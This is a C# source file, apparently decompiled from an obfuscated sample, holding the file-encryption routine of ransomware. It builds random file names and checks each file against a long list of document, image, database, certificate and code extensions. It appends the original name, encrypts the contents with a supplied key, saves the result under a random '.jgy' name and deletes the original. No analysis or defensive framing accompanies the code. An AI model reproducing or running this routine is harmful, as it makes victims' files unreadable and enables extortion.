using System;
using System.IO;
using System.Text;
using System.Threading;

public class _Trinity_Obfuscator_znhb_Trinity_Obfuscator_
{
	public static string _Trinity_Obfuscator_nAIb_Trinity_Obfuscator_()
	{
		string text = "";
		string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()";
		Random random = new Random();
		int num = random.Next(7, 13);
		while (num-- > 0)
		{
			text += text2[random.Next(text2.Length)];
		}
		return text;
	}

	public static bool _Trinity_Obfuscator_DPcC_Trinity_Obfuscator_(string string_0, byte[] byte_0)
	{
		try
		{
			string text = ".png .3dm .3g2 .3gp .aaf .accdb .aep .aepx .aet .ai .aif .arw .as .as3 .asf .asp .asx .avi .bay .bmp .cdr .cer .class .cpp .cr2 .crt .crw .config .cs .css .csv .db .dbf .dcr .der .dng .doc .docb .docm .docx .dot .dotm .dotx .dwg .dll .dxf .dxg .exe .efx .eps .erf .fla .flv .html .idml .iff .indb .ico .ini .indd .indl .indt .inx .js .jar .java .jpeg .jpg .kdc .m3u .m3u8 .m4u .max .mdb .mdf .mef .mid .mov .mp3 .mp4 .mpa .msi .mpeg .mpg .mrw .msg .nef .nrw .odb .odc .odm .odp .ods .odt .orf .p12 .p7b .p7c .pdb .pdf .pef .pem .pfx .php .plb .pmd .pot .potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel .prproj .ps .psd .pst .ptx .r3d .ra .raf .rar .raw .rb .rtf .rw2 .rwl .sdf .sldm .sldx .sql .sr2 .srf .srw .svg .swf .tif .txt .vcf .vob .wav .wb2 .wma .wmv .wpd .wps .x3f .xla .xlam .xlk .xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx .zip";
			string text2 = new FileInfo(string_0).DirectoryName + "\\";
			string name = new FileInfo(string_0).Name;
			string text3 = new FileInfo(string_0).Extension.ToLower();
			if (!text.Contains(text3) || text3 == "")
			{
				return false;
			}
			byte[] array = File.ReadAllBytes(string_0);
			byte[] bytes = Encoding.UTF8.GetBytes(name);
			if (bytes.Length > 255)
			{
				return false;
			}
			Array.Resize(ref array, array.Length + 256);
			Array.ConstrainedCopy(bytes, 0, array, array.Length - 256, bytes.Length);
			File.WriteAllBytes(text2 + _Trinity_Obfuscator_nAIb_Trinity_Obfuscator_() + ".jgy", _Trinity_Obfuscator_HhUw_Trinity_Obfuscator_._Trinity_Obfuscator_hsjL_Trinity_Obfuscator_(array, byte_0));
			File.Delete(string_0);
			Thread.Sleep(500);
			return true;
		}
		catch (Exception)
		{
		}
		return false;
	}
}
